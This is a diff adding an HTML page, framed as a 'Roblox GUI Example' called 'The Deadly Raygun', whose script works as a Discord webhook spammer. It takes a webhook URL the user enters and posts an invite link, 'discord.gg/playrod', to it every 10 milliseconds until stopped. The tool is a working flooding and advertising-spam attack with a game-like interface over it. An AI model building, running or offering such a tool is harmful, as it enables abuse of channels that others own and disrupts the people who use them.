@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox GUI Example</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #141414;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .outer-frame {
+      background-color: rgb(12, 52, 117);
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    .inner-frame {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .title {
+      color: #fff;
+      font-size: 36px;
+      margin-bottom: 20px;
+    }
+
+    .sub-text {
+      color: #00ff00;
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .raygun-status {
+      color: #fff;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .raygun-status.activated {
+      color: #00ff00;
+    }
+
+    .raygun-status.incorrect {
+      color: #ff0000;
+    }
+
+    .webhook-input {
+      background-color: #4d4d4d;
+      color: #e0e0e0;
+      font-size: 16px;
+      padding: 8px 12px;
+      border: none;
+      border-radius: 4px;
+      margin-bottom: 10px;
+      width: 300px;
+    }
+
+    .button2 {
+      background-color: #4d4d4d;
+      color: #e0e0e0;
+      font-size: 16px;
+      padding: 12px 40px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .button2:hover {
+      background-color: #5d5d5d;
+    }
+  </style>
+</head>
+<body>
+  <div class="outer-frame">
+    <div class="inner-frame">
+      <div class="title">The Deadly Raygun</div>
+      <input type="text" class="webhook-input" placeholder="Enter webhook URL">
+      <div class="sub-text"></div>
+      <div class="raygun-status">Raygun Status:</div>
+      <button class="button2">Shoot Raygun</button>
+    </div>
+  </div>
+
+  <script>
+    const webhookInput = document.querySelector('.webhook-input');
+    const subText = document.querySelector('.sub-text');
+    const button2 = document.querySelector('.button2');
+    const raygunStatusText = document.querySelector('.raygun-status');
+
+    let intervalId;
+    let isActivated = false;
+
+    async function sendToDiscord(message, webhookUrl) {
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ content: message })
+        });
+
+        if (!response.ok) {
+          console.error('Failed to send message to Discord:', response.status);
+          return false;
+        }
+        return true;
+      } catch (error) {
+        console.error('Error sending message to Discord:', error);
+        return false;
+      }
+    }
+
+    button2.addEventListener('click', async () => {
+      const webhookUrl = webhookInput.value.trim();
+      if (!isActivated && webhookUrl.includes('https://discord.com/api/webhooks/')) {
+        const isSent = await sendToDiscord('discord.gg/playrod', webhookUrl);
+        if (isSent) {
+          intervalId = setInterval(async () => {
+            await sendToDiscord('discord.gg/playrod', webhookUrl);
+          }, 10); // Send message to Discord every 10 milliseconds
+          isActivated = true;
+          raygunStatusText.textContent = 'Beamed!!!';
+          raygunStatusText.classList.add('activated');
+          raygunStatusText.classList.remove('incorrect');
+        } else {
+          raygunStatusText.textContent = 'Invalid Target';
+          raygunStatusText.classList.add('incorrect');
+          raygunStatusText.classList.remove('activated');
+          setTimeout(() => {
+            raygunStatusText.textContent = 'Raygun Status:';
+            raygunStatusText.classList.remove('incorrect');
+          }, 5000);
+        }
+      } else {
+        clearInterval(intervalId);
+        isActivated = false;
+        raygunStatusText.textContent = 'Raygun Status:';
+        raygunStatusText.classList.remove('activated');
+      }
+    });
+  </script>
+</body>
+</html>
